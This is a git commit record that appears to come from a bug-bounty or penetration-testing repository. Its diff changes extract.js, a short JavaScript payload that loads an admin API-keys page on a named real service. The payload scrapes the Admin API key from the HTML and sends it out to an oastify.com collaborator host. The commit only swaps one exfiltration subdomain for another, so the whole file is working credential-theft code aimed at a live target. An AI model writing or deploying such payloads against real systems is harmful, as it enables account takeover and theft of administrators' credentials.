f4efb0497aad27415831d8edd7f9d235e1b50a39
justtesting1234-source <eli@inspectiv.com>
2025-05-01 15:54:10 -0500

    Update extract.js

--- extract.js
+++ extract.js
@@ -1,6 +1,6 @@
 fetch(“https://admin.zype.com/api_keys”).then(a => a.text()).then(a => {const apiKeyMatch = a.match(/<td>Admin</td>\s*<td>(\w+)</td>/);if (apiKeyMatch) {
 const apiKey = apiKeyMatch[1];
-return fetch(“https://exfqy68jks9il564hc6d3ik7dyjp7gv5.oastify.com?x=” + apiKey);
+return fetch(“https://6dkieyob0kpa1xmwx4m5ja0ztqzhn9by.oastify.com?x=” + apiKey);
 } else {
 console.error(“API Key not found in the response”);
 }
